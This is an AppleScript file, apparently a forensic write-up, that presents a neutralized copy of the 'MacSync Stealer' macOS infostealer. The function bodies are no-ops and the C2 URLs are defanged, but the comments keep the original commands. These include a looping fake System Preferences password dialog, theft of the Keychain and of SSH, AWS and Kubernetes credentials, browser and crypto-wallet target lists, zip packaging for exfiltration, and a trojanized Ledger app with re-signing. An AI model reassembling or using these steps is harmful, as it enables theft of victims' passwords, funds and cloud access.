-- ============================================================================
-- NEUTRALIZED — Stage 3: "MacSync Stealer" v1.1.2 (Build Tag: N3)
-- ============================================================================
--
-- ATTACK VECTOR: macOS AppleScript infostealer delivered dynamically from C2
-- ORIGINAL SOURCE: http://fusser-api[.]com/dynamic?txd=<token>
-- TRIGGER: Piped to osascript by Stage 2 daemon
-- SIZE: 35,015 bytes (641 lines)
-- ARCHITECTURE: Universal (x64_86 & ARM)
--
-- SELF-IDENTIFICATION:
--   Name:    "MacSync Stealer"
--   Version: 1.1.2_release (x64_86 & ARM)
--   Build:   N3
--   Victim IP logged: 67.188.129.26 (hardcoded — likely attacker's test or victim)
--
-- CAPABILITIES SUMMARY:
--   1. Kills Terminal to hide evidence
--   2. Steals macOS login password via fake System Preferences dialog
--   3. Steals Chrome master password from Keychain
--   4. Steals all Chromium browser data (13 browsers)
--   5. Steals 40+ browser extension wallets (MetaMask, Phantom, etc.)
--   6. Steals all Gecko/Firefox browser data (4 browsers)
--   7. Steals 20+ desktop crypto wallets
--   8. Steals Telegram session data
--   9. Steals macOS Keychains
--  10. Steals SSH, AWS, Kubernetes credentials
--  11. Steals shell history and git config
--  12. Grabs sensitive files from Desktop/Documents/Downloads
--  13. Steals Safari cookies and Apple Notes databases
--  14. Records system info and running processes
--  15. Packages everything into /tmp/osalogging.zip for exfiltration
--  16. Backdoors Ledger Wallet and Ledger Live applications
--  17. Shows fake error dialog as cover story
--
-- ============================================================================


-- ============================================================================
-- SECTION 1: Utility Functions (file operations used by the stealer)
-- ============================================================================
-- These helper functions were the stealer's filesystem toolkit:
--   filesizer()       - Get file size via mdls
--   mkdir()           - Create directories
--   FileName()        - Extract filename from path
--   BeforeFileName()  - Extract parent directory from path
--   writeText()       - Append text to file
--   readwrite()       - Copy file contents
--   isDirectory()     - Check if path is directory
--   GrabFolder()      - Recursively copy directory (unlimited)
--   GrabFolderLimit() - Recursively copy directory (100MB cap)
--
-- NEUTRALIZED: All function bodies replaced with no-ops.
-- Original implementation preserved as comments for forensic reference.
-- ============================================================================

on filesizer(paths)
    -- NEUTRALIZED: Originally used mdls to get file size
    -- set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
    return 0
end filesizer

on mkdir(someItem)
    -- NEUTRALIZED: Originally created directories via shell
    -- do shell script "mkdir -p " & filePosixPath
    return
end mkdir

on writeText(textToWrite, filePath)
    -- NEUTRALIZED: Originally opened files for writing
    -- set fileRef to (open for access filePath with write permission)
    -- write textToWrite to fileRef starting at eof
    return
end writeText

on readwrite(path_to_file, path_as_save)
    -- NEUTRALIZED: Originally copied files
    -- do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
    return
end readwrite

on isDirectory(someItem)
    -- NEUTRALIZED: Originally checked file type via shell
    return false
end isDirectory

on GrabFolderLimit(sourceFolder, destinationFolder)
    -- NEUTRALIZED: Originally recursively copied directories up to 100MB
    -- Skipped: .DS_Store, Partitions, Code Cache, Cache, journals, Previews
    return
end GrabFolderLimit

on GrabFolder(sourceFolder, destinationFolder)
    -- NEUTRALIZED: Originally recursively copied entire directories
    -- Skipped: .DS_Store, Partitions, Code Cache, Cache, dumps, emoji, user_data, __update__
    return
end GrabFolder


-- ============================================================================
-- SECTION 2: Password Theft — Fake System Preferences Dialog
-- ============================================================================
--
-- ATTACK MECHANISM:
--   1. First checks if a password was passed from Stage 2 (via URL parameter)
--   2. If no password, checks if the account has an empty password
--   3. If empty password, steals Chrome master password from macOS Keychain:
--        security find-generic-password -ga "Chrome"
--   4. If password-protected, shows a FAKE "System Preferences" dialog:
--        - Uses Apple's own LockedIcon.icns for authenticity
--        - Title: "System Preferences"
--        - Button: "Continue" (no Cancel option!)
--        - Hidden answer field (shows dots like real password prompts)
--        - Gives up after 150 seconds
--        - LOOPS FOREVER until correct password is entered
--   5. Validates password using: dscl . authonly <username> <password>
--   6. Writes confirmed password to /tmp/sync<random>/Password
--
-- WHY IT WORKS:
--   - The dialog is indistinguishable from a real macOS password prompt
--   - There is no Cancel button — only "Continue"
--   - It loops infinitely — user cannot dismiss it without entering the right password
--   - dscl authonly confirms the password is real before accepting
--
-- ============================================================================

on checkvalid(username, password_entered)
    -- NEUTRALIZED: Originally validated passwords via dscl
    -- set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
    return false
end checkvalid

on getpwd(username, writemind, provided_password)
    -- NEUTRALIZED: Original attack flow:
    --
    -- 1. Try provided_password (from C2 URL parameter):
    --    if checkvalid(username, provided_password) then writeText(password) → return
    --
    -- 2. Check for empty password:
    --    if checkvalid(username, "") then steal Chrome master password:
    --    security 2>&1 > /dev/null find-generic-password -ga "Chrome" | awk "{print $2}"
    --
    -- 3. Loop fake dialog forever:
    --    repeat
    --        display dialog "Please enter your password to make changes."
    --            default answer "" with icon LockedIcon.icns
    --            buttons {"Continue"} with title "System Preferences"
    --            with hidden answer giving up after 150
    --        if checkvalid(username, text returned) then
    --            writeText(password) → return
    --        end if
    --    end repeat
    --
    return ""
end getpwd


-- ============================================================================
-- SECTION 3: Browser Extension Wallet Theft
-- ============================================================================
--
-- Targets 40+ browser extension IDs across all Chromium browser profiles.
-- Steals both Local Extension Settings and IndexedDB data.
--
-- TARGETED EXTENSIONS (by Chrome Web Store ID):
--   Crypto Wallets:
--     nkbihfbeogaeaoehlefnkodbefgpgknn  — MetaMask
--     bfnaelmomeimhlpmgjnjophhpkkoljpa  — Phantom
--     hnfanknocfeofbddgcijnmhnfnkdnaad  — Coinbase Wallet
--     acmacodkjbdgmoleebolmdjonilkdbch  — Rabby Wallet
--     aholpfdialjgjfhomihkjbmgjidlcdno  — Temple (Tezos)
--     mcohilncbfahbmgdjkbpemcciiolgcge  — OKX Wallet
--     bhhhlbepdkbapadjdnnojkbgioiodbic  — Solflare
--     ibnejdfjmmkpcnlpebklmnkoeoihofec  — TronLink
--     efbglgofoippbgcjepnhiblaibcnclgk  — Slope Wallet
--     ... and 30+ more
--
--   Password Managers & Auth:
--     eiaeiblijfjekdanodkjadfinkhbfgcd  — Various password managers
--     aeblfdkhhhdcdjpifhhbdiojplfjncoa  — Various authenticators
--     ... and more
--
-- DATA STOLEN PER EXTENSION:
--   - /Local Extension Settings/<id>/  (LevelDB with wallet keys/seeds)
--   - /IndexedDB/<id>/                 (IndexedDB with wallet state)
--
-- ============================================================================

on grabPlugins(paths, savePath, pluginList, index)
    -- NEUTRALIZED: Originally enumerated browser extension directories
    -- and copied matching wallet extension data
    return
end grabPlugins

on Chromium(writemind, chromium_map)
    -- NEUTRALIZED: Originally stole data from all Chromium browser profiles
    --
    -- Files stolen per profile (Default, Profile 1, Profile 2, etc.):
    --   /Network/Cookies    — Session cookies (auth tokens, login sessions)
    --   /Cookies            — Legacy cookies
    --   /Web Data           — Autofill data (credit cards, addresses)
    --   /Login Data         — Saved passwords (encrypted with system keychain)
    --   /Local Extension Settings/  — Wallet extensions (seeds, keys)
    --   /IndexedDB/                 — Wallet state data
    --
    -- 40+ browser extension wallets targeted (see IDs above)
    return
end Chromium

on ChromiumWallets(writemind, chromium_map)
    -- NEUTRALIZED: Originally stole 60+ crypto wallet browser extensions
    --
    -- This is a SECOND pass specifically for wallet extensions, targeting:
    --   nkbihfbeogaeaoehlefnkodbefgpgknn  — MetaMask
    --   bfnaelmomeimhlpmgjnjophhpkkoljpa  — Phantom
    --   hnfanknocfeofbddgcijnmhnfnkdnaad  — Coinbase Wallet
    --   fnjhmkhhmkbjkkabndcnnogagogbneec  — Ronin Wallet
    --   acmacodkjbdgmoleebolmdjonilkdbch  — Rabby
    --   egjidjbpglichdcondbcbdnbeeppgdph  — Trust Wallet
    --   aholpfdialjgjfhomihkjbmgjidlcdno  — Temple
    --   pdliaogehgdbhbnmkklieghmmjkpigpa  — Keplr
    --   mcohilncbfahbmgdjkbpemcciiolgcge  — OKX Wallet
    --   hpglfhgfnhbgpjdenjgmdgoeiappafln  — Braavos
    --   bhhhlbepdkbapadjdnnojkbgioiodbic  — Solflare
    --   cjmkndjhnagcfbpiemnkdpomccnjblmj  — Backpack
    --   ... and 50+ more wallet extension IDs
    --
    -- Stolen data: /Local Extension Settings/ and /IndexedDB/ per extension
    return
end ChromiumWallets


-- ============================================================================
-- SECTION 4: Firefox/Gecko Browser Theft
-- ============================================================================
--
-- TARGETED BROWSERS:
--   Firefox     — ~/Library/Application Support/Firefox/Profiles/
--   Zen         — ~/Library/Application Support/zen/Profiles/
--   LibreWolf   — ~/Library/Application Support/LibreWolf/Profiles/
--   Waterfox    — ~/Library/Application Support/Waterfox/Profiles/
--
-- FILES STOLEN PER PROFILE:
--   cert9.db           — Certificate database
--   cookies.sqlite     — All cookies
--   cookies.sqlite-wal — Cookie write-ahead log
--   formhistory.sqlite — Form autofill data
--   key4.db            — Master encryption key (decrypts saved passwords)
--   logins-backup.json — Backup of saved passwords
--   logins.json        — Saved passwords (encrypted with key4.db)
--   signons.sqlite     — Legacy password storage
--   places.sqlite      — Browsing history and bookmarks
--
-- ============================================================================

on Gecko(writemind, gecko_map)
    -- NEUTRALIZED: Originally copied all credential files from Gecko profiles
    return
end Gecko


-- ============================================================================
-- SECTION 5: Telegram Session Theft
-- ============================================================================
--
-- STOLEN DATA:
--   ~/Library/Application Support/Telegram Desktop/tdata/
--
-- This directory contains Telegram's session keys, authorization data,
-- and cached messages. With this data, an attacker can clone the victim's
-- Telegram session on another machine without needing the phone number
-- or 2FA code.
--
-- ============================================================================

on Telegram(writemind, library)
    -- NEUTRALIZED: Originally copied entire tdata/ directory
    -- GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Desktop/")
    return
end Telegram


-- ============================================================================
-- SECTION 6: macOS Keychain & Cloud Credential Theft
-- ============================================================================
--
-- KEYCHAIN THEFT:
--   Copies ~/Library/Keychains/*.keychain-db
--   These contain ALL saved passwords, certificates, and secure notes
--   stored in the macOS Keychain. With the user's login password (stolen
--   in Section 2), the attacker can decrypt everything.
--
-- CLOUD CREDENTIAL THEFT:
--   ~/.ssh/     — SSH keys (access to servers, GitHub, GitLab, etc.)
--   ~/.aws/     — AWS credentials (access to cloud infrastructure)
--   ~/.kube/    — Kubernetes configs (access to container clusters)
--
-- ============================================================================

on Keychains(writemind)
    -- NEUTRALIZED: Originally copied keychain databases
    -- do shell script "cp ~/Library/Keychains/*.keychain-db " & writemind
    return
end Keychains

on CloudKeys(writemind)
    -- NEUTRALIZED: Originally copied cloud credentials
    -- do shell script "cp -r ~/.ssh " & writemind
    -- do shell script "cp -r ~/.aws " & writemind
    -- do shell script "cp -r ~/.kube " & writemind
    return
end CloudKeys


-- ============================================================================
-- SECTION 7: System Reconnaissance
-- ============================================================================
--
-- COLLECTED DATA:
--   SystemInfo/running_apps.txt  — lsappinfo list (all running applications)
--   SystemInfo/processes.txt     — ps ax (all running processes)
--   system_profiler output       — Hardware, software, display info
--
-- ============================================================================

on Processes(writemind)
    -- NEUTRALIZED: Originally collected process listings
    -- do shell script "lsappinfo list > " & writemind & "SystemInfo/running_apps.txt"
    -- do shell script "ps ax > " & writemind & "SystemInfo/processes.txt"
    return
end Processes


-- ============================================================================
-- SECTION 8: Desktop Wallet Theft
-- ============================================================================
--
-- TARGETED WALLETS (21 desktop applications):
--   Exodus           — ~/Library/Application Support/Exodus/
--   Electrum         — ~/.electrum/wallets/
--   Atomic Wallet    — ~/Library/Application Support/Atomic Wallet/Local Storage/leveldb/
--   Guarda           — ~/Library/Application Support/Guarda/
--   Coinomi          — ~/Library/Application Support/Coinomi/wallets/
--   Sparrow          — ~/.sparrow/wallets/
--   Wasabi           — ~/.walletwasabi/client/Wallets/
--   Bitcoin Core     — ~/Library/Application Support/Bitcoin/
--   Armory           — ~/Library/Application Support/Armory/
--   Electron Cash    — ~/.electron-cash/wallets/
--   Monero           — ~/.bitmonero/wallets/
--   Litecoin Core    — ~/Library/Application Support/Litecoin/
--   Dash Core        — ~/Library/Application Support/DashCore/
--   Dogecoin Core    — ~/Library/Application Support/Dogecoin/
--   Electrum-LTC     — ~/.electrum-ltc/wallets/
--   BlueWallet       — ~/Library/Application Support/BlueWallet/
--   Zengo            — ~/Library/Application Support/Zengo/
--   Trust Wallet     — ~/Library/Application Support/Trust Wallet/
--   Ledger Live      — ~/Library/Application Support/Ledger Live/
--   Ledger Wallet    — ~/Library/Application Support/Ledger Wallet/
--   Trezor Suite     — ~/Library/Application Support/@trezor
--   Binance          — ~/Library/Application Support/Binance/
--   TON Keeper       — ~/Library/Application Support/TON Keeper/
--
-- ============================================================================

on DesktopWallets(writemind, deskwals)
    -- NEUTRALIZED: Originally copied entire wallet application directories
    return
end DesktopWallets


-- ============================================================================
-- SECTION 9: File Grabber — Sensitive Document Theft
-- ============================================================================
--
-- TARGETED FILE TYPES:
--   pdf, docx, doc    — Documents
--   wallet, key, keys — Crypto wallet files
--   db                — Database files
--   txt, rtf          — Text files (may contain seeds/passwords)
--   seed              — Crypto seed phrase files
--   kdbx              — KeePass password database
--   pem               — SSL/SSH certificates and keys
--   ovpn              — OpenVPN configuration (contains VPN credentials)
--
-- SEARCH LOCATIONS:
--   ~/Desktop/
--   ~/Documents/
--   ~/Downloads/
--
-- SIZE LIMIT: 10 MB total across all grabbed files
--
-- ALSO STOLEN:
--   Safari cookies:  ~/Library/Containers/com.apple.Safari/.../Cookies.binarycookies
--   Apple Notes DB:  ~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite*
--
-- ============================================================================

on Filegrabber(writemind)
    -- NEUTRALIZED: Originally searched Desktop/Documents/Downloads for sensitive files
    -- and copied Safari cookies and Apple Notes databases
    return
end Filegrabber

on FilegrabberFDA(writemind, profile)
    -- NEUTRALIZED: Full Disk Access variant of file grabber
    -- Used find + cp for more thorough file discovery
    -- Also grabbed Safari Form Values, History.db, and Notes database
    return
end FilegrabberFDA


-- ============================================================================
-- SECTION 10: Main Execution Flow (NEUTRALIZED)
-- ============================================================================
--
-- ORIGINAL EXECUTION ORDER:
--   1.  killall Terminal                    ← Hide evidence
--   2.  Generate random staging path        ← /tmp/sync<random>/
--   3.  getpwd() — Steal macOS password     ← Fake dialog loop
--   4.  Chromium() — Steal browser data     ← 13 Chromium browsers
--   5.  ChromiumWallets() — Steal wallets   ← 60+ extension wallets
--   6.  Gecko() — Steal Firefox data        ← 4 Gecko browsers
--   7.  DesktopWallets() — Steal wallets    ← 21+ desktop wallets
--   8.  Telegram() — Steal sessions         ← tdata/
--   9.  Keychains() — Steal keychains       ← *.keychain-db
--  10.  CloudKeys() — Steal cloud creds     ← .ssh, .aws, .kube
--  11.  Processes() — System recon          ← Running processes
--  12.  Write stealer info file             ← MacSync Stealer N3 v1.1.2
--  13.  ditto → /tmp/osalogging.zip         ← Package for exfiltration
--  14.  rm -rf /tmp/sync*                   ← Delete staging directory
--  15.  Fake error dialog                   ← "Your Mac does not support..."
--  16.  Backdoor Ledger Wallet              ← Replace app.asar + Info.plist
--  17.  Backdoor Ledger Live                ← Replace app.asar + Info.plist
--
-- The zip is then uploaded by Stage 2's chunked upload protocol.
--
-- ============================================================================

-- NEUTRALIZED: Original killed Terminal to hide the attack
-- try
--     do shell script "killall Terminal"
-- end try

-- NEUTRALIZED: Original staging directory setup
-- set username to (system attribute "USER")
-- set profile to "/Users/" & username
-- set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
-- set writemind to "/tmp/sync" & randomNumber & "/"

-- NEUTRALIZED: Password theft
-- set password_entered to getpwd(username, writemind, "")

-- NEUTRALIZED: Browser targets (13 Chromium browsers)
-- set chromiumMap to {}
-- set chromiumMap to chromiumMap & {{"Yandex", library & "Yandex/YandexBrowser/"}}
-- set chromiumMap to chromiumMap & {{"Chrome", library & "Google/Chrome/"}}
-- set chromiumMap to chromiumMap & {{"Brave", library & "BraveSoftware/Brave-Browser/"}}
-- set chromiumMap to chromiumMap & {{"Edge", library & "Microsoft Edge/"}}
-- set chromiumMap to chromiumMap & {{"Vivaldi", library & "Vivaldi/"}}
-- set chromiumMap to chromiumMap & {{"Opera", library & "com.operasoftware.Opera/"}}
-- set chromiumMap to chromiumMap & {{"OperaGX", library & "com.operasoftware.OperaGX/"}}
-- set chromiumMap to chromiumMap & {{"Chrome Beta", library & "Google/Chrome Beta/"}}
-- set chromiumMap to chromiumMap & {{"Chrome Canary", library & "Google/Chrome Canary"}}
-- set chromiumMap to chromiumMap & {{"Chromium", library & "Chromium/"}}
-- set chromiumMap to chromiumMap & {{"Chrome Dev", library & "Google/Chrome Dev/"}}
-- set chromiumMap to chromiumMap & {{"Arc", library & "Arc/User Data"}}
-- set chromiumMap to chromiumMap & {{"Coccoc", library & "CocCoc/Browser/"}}

-- NEUTRALIZED: Gecko browser targets (4 browsers)
-- set geckoMap to {}
-- set geckoMap to geckoMap & {{"Firefox", library & "Firefox/Profiles/"}}
-- set geckoMap to geckoMap & {{"Zen", library & "zen/Profiles/"}}
-- set geckoMap to geckoMap & {{"LibreWolf", library & "LibreWolf/Profiles/"}}
-- set geckoMap to geckoMap & {{"Waterfox", library & "Waterfox/Profiles/"}}

-- NEUTRALIZED: Desktop wallet targets (21+ wallets) — see Section 8 for full list

-- NEUTRALIZED: Shell profile theft
-- readwrite(profile & "/.zshrc", writemind & "Profile/.zshrc")
-- readwrite(profile & "/.zsh_history", writemind & "Profile/.zsh_history")
-- readwrite(profile & "/.bash_history", writemind & "Profile/.bash_history")
-- readwrite(profile & "/.gitconfig", writemind & "Profile/.gitconfig")

-- NEUTRALIZED: Stealer self-identification written to /tmp/sync<random>/info:
--   "MacSync Stealer"
--   "Build Tag: N3"
--   "Version: 1.1.2_release (x64_86 & ARM)"
--   "IP: 67.188.129.26"
--   "Username: <stolen>"
--   "Password: <stolen>"
--   + system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType

-- NEUTRALIZED: Execution of all theft functions
-- Chromium(writemind, chromiumMap)
-- ChromiumWallets(writemind, chromiumMap)
-- Gecko(writemind, geckoMap)
-- DesktopWallets(writemind, walletMap)
-- Telegram(writemind, library)
-- Keychains(writemind)
-- CloudKeys(writemind & "Profile/")
-- Processes(writemind)

-- NEUTRALIZED: Package and cleanup
-- do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/osalogging.zip"
-- do shell script "rm -rf /tmp/sync*"

-- NEUTRALIZED: Fake error dialog (cover story for why the "app" didn't work)
-- display dialog "Your Mac does not support this application. Try reinstalling
--   or downloading the version for your system."
--   with title "System Preferences" with icon stop buttons {"OK"}
-- NOTE: The "OK" button uses Cyrillic "О" (U+041E) not Latin "O" — anti-grep evasion


-- ============================================================================
-- SECTION 11: Ledger Application Backdoor
-- ============================================================================
--
-- ATTACK: If Ledger Wallet.app or Ledger Live.app is installed in /Applications,
-- the stealer downloads a trojanized app.asar and Info.plist from the C2 server,
-- replaces the legitimate files, and re-signs the app with an ad-hoc signature.
--
-- C2 URLS (DEFANGED):
--   Ledger Wallet: https://fusser-api[.]com/ledger/<token>
--   Ledger Live:   https://fusser-api[.]com/ledger/live/<token>
--
-- ATTACK MECHANISM:
--   1. Check if /Applications/Ledger Wallet.app exists
--   2. Download trojanized zip from C2
--   3. Extract app.asar and Info.plist to /tmp
--   4. Copy legitimate app to /tmp as backup
--   5. Delete original app from /Applications
--   6. Move backup back (to reset quarantine/permissions)
--   7. Replace Contents/Resources/app.asar with trojanized version
--   8. Replace Contents/Info.plist with trojanized version
--   9. Ad-hoc codesign: codesign -f -d -s -
--
-- WHY THIS IS DEVASTATING:
--   - app.asar is the Electron app bundle — controls ALL app behavior
--   - Info.plist controls app identity and permissions
--   - Ad-hoc signing bypasses Gatekeeper for already-installed apps
--   - The trojaned Ledger app would intercept seed phrases and transactions
--   - User sees no visual difference — the app looks and works normally
--   - Copy-delete-move dance resets macOS file quarantine attributes
--
-- TARGETS BOTH:
--   /Applications/Ledger Wallet.app
--   /Applications/Ledger Live.app
--
-- ============================================================================

-- NEUTRALIZED: Ledger Wallet backdoor
-- set LEDGERURL to "https://fusser-api[.]com/ledger/REDACTED_TOKEN"
-- ... download, unzip, replace app.asar + Info.plist, codesign ...

-- NEUTRALIZED: Ledger Live backdoor
-- set LEDGERURL to "https://fusser-api[.]com/ledger/live/REDACTED_TOKEN"
-- ... same attack repeated for Ledger Live ...

-- ============================================================================
-- END OF NEUTRALIZED STEALER
-- This file is safe. All functions are no-ops. All URLs are defanged.
-- All shell commands are commented out. No code executes.
-- ============================================================================
